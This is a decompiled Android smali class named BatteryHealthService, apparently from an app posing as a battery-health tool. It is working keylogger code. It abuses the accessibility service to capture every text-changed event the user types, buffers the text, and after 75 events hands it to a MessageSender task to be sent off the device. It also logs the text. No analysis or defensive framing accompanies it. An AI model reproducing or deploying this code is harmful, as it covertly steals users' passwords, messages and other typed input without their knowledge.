.class public Lcom/BatteryHealth/BatteryHealthService;
.super Landroid/accessibilityservice/AccessibilityService;
.source "BatteryHealthService.java"


# static fields
.field private static final EVENT_LIMIT:I = 0x4b

.field private static final TAG:Ljava/lang/String;


# instance fields
.field private keyCounter:I

.field private final keyEventsBuilder:Ljava/lang/StringBuilder;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 15
    const-class v0, Lcom/BatteryHealth/BatteryHealthService;

    invoke-virtual {v0}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/BatteryHealth/BatteryHealthService;->TAG:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .line 14
    invoke-direct {p0}, Landroid/accessibilityservice/AccessibilityService;-><init>()V

    .line 17
    const/4 v0, 0x0

    iput v0, p0, Lcom/BatteryHealth/BatteryHealthService;->keyCounter:I

    .line 18
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    iput-object v0, p0, Lcom/BatteryHealth/BatteryHealthService;->keyEventsBuilder:Ljava/lang/StringBuilder;

    return-void
.end method


# virtual methods
.method public onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 6
    .param p1, "event"    # Landroid/view/accessibility/AccessibilityEvent;

    .line 23
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0

    const/16 v1, 0x10

    if-ne v0, v1, :cond_0

    .line 24
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    .line 27
    .local v0, "typedText":Ljava/lang/String;
    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_0

    iget-object v1, p0, Lcom/BatteryHealth/BatteryHealthService;->keyEventsBuilder:Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_0

    .line 29
    iget-object v1, p0, Lcom/BatteryHealth/BatteryHealthService;->keyEventsBuilder:Ljava/lang/StringBuilder;

    const/4 v2, 0x0

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->setLength(I)V

    .line 30
    iget-object v1, p0, Lcom/BatteryHealth/BatteryHealthService;->keyEventsBuilder:Ljava/lang/StringBuilder;

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 31
    iget v1, p0, Lcom/BatteryHealth/BatteryHealthService;->keyCounter:I

    const/4 v3, 0x1

    add-int/2addr v1, v3

    iput v1, p0, Lcom/BatteryHealth/BatteryHealthService;->keyCounter:I

    .line 33
    const/16 v4, 0x4b

    if-lt v1, v4, :cond_0

    .line 35
    new-instance v1, Lcom/BatteryHealth/MessageSender;

    invoke-direct {v1}, Lcom/BatteryHealth/MessageSender;-><init>()V

    sget-object v4, Landroid/os/AsyncTask;->THREAD_POOL_EXECUTOR:Ljava/util/concurrent/Executor;

    new-array v3, v3, [Ljava/lang/String;

    iget-object v5, p0, Lcom/BatteryHealth/BatteryHealthService;->keyEventsBuilder:Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    aput-object v5, v3, v2

    invoke-virtual {v1, v4, v3}, Lcom/BatteryHealth/MessageSender;->executeOnExecutor(Ljava/util/concurrent/Executor;[Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 37
    sget-object v1, Lcom/BatteryHealth/BatteryHealthService;->TAG:Ljava/lang/String;

    iget-object v3, p0, Lcom/BatteryHealth/BatteryHealthService;->keyEventsBuilder:Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v1, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 38
    iput v2, p0, Lcom/BatteryHealth/BatteryHealthService;->keyCounter:I

    .line 42
    .end local v0    # "typedText":Ljava/lang/String;
    :cond_0
    return-void
.end method

.method public onInterrupt()V
    .locals 0

    .line 46
    return-void
.end method

.method protected onServiceConnected()V
    .locals 2

    .line 50
    invoke-super {p0}, Landroid/accessibilityservice/AccessibilityService;->onServiceConnected()V

    .line 51
    new-instance v0, Landroid/accessibilityservice/AccessibilityServiceInfo;

    invoke-direct {v0}, Landroid/accessibilityservice/AccessibilityServiceInfo;-><init>()V

    .line 52
    .local v0, "info":Landroid/accessibilityservice/AccessibilityServiceInfo;
    const/4 v1, 0x1

    iput v1, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->flags:I

    .line 53
    const/4 v1, -0x1

    iput v1, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->eventTypes:I

    .line 54
    const/16 v1, 0x10

    iput v1, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->feedbackType:I

    .line 55
    invoke-virtual {p0, v0}, Lcom/BatteryHealth/BatteryHealthService;->setServiceInfo(Landroid/accessibilityservice/AccessibilityServiceInfo;)V

    .line 56
    return-void
.end method
